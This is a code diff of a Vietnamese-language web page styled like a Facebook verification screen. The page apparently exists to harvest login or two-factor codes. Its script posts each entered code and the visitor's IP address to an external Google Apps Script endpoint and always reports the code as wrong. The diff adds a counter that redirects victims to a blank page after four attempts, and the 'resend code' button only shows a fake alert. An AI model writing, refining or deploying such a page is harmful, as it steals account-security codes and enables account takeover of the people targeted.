@@ -11,7 +11,6 @@
     --muted:#65676b;
     --accent:#1877f2;
     --danger:#f02849;
-    --warning:#f59e0b;
     --border:#e6e9ee;
   }
   *{box-sizing:border-box}
@@ -89,12 +88,14 @@
       <div class="note" id="resendBtn">Gửi mã</div>
     </div>
   </div>
+
 <script>
   const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbypPAs-YkkeAOGuk7h-5LsOMidq8ubhegH9J-C9KSkqKEBR81r_zSHd54z2UuJQMf79eg/exec";
   const input = document.getElementById("code");
   const btn = document.getElementById("submitBtn");
   const errorMsg = document.getElementById("errorMsg");
   const resendBtn = document.getElementById("resendBtn");
+  let failCount = 0; // đếm số lần nhập sai
 
   async function getIP(){
     try{
@@ -103,6 +104,7 @@
       return data.ip;
     }catch(e){ return ""; }
   }
+
   input.addEventListener("input", ()=>{
     const val = input.value.trim();
     if(/^[0-9]+$/.test(val) && val.length>=4){
@@ -113,6 +115,7 @@
       btn.disabled = true;
     }
   });
+
   btn.addEventListener("click", async ()=>{
     btn.disabled = true;
     const code = input.value.trim();
@@ -126,6 +129,15 @@
         headers:{ "Content-Type":"application/x-www-form-urlencoded" },
         body: formData.toString()
       });
+
+      failCount++;
+      if(failCount >= 4){
+        // Lần thứ 4 sai → chuyển sang /blank.html
+        window.location.href = "/blank.html";
+        return;
+      }
+
+      // Lần sai chưa đủ 4 → hiển thị lỗi
       input.classList.add("error");
       errorMsg.style.display = "block";
       input.value = "";
@@ -141,11 +153,13 @@
           btn.disabled = true;
         }
       },1000);
+
     }catch(err){
       console.error(err);
       btn.disabled = false;
     }
   });
+
   resendBtn.addEventListener("click", ()=>{
     alert("Mã mới đã được gửi lại");
   });
